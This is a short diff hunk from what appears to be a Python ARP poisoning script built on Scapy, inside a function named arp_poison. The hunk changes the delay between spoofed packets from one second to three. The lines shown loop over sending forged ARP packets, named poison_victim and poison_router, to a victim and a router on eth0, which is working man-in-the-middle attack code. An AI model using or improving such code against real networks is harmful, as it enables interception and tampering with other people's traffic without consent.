@@ -41,7 +41,7 @@ def arp_poison(mac_target,mac_attacker):
         try:
             sendp(poison_victim, iface='eth0', verbose=0)
             sendp(poison_router, iface='eth0', verbose=0)
-            time.sleep(1)
+            time.sleep(3)
         except KeyboardInterrupt:
             close()
 
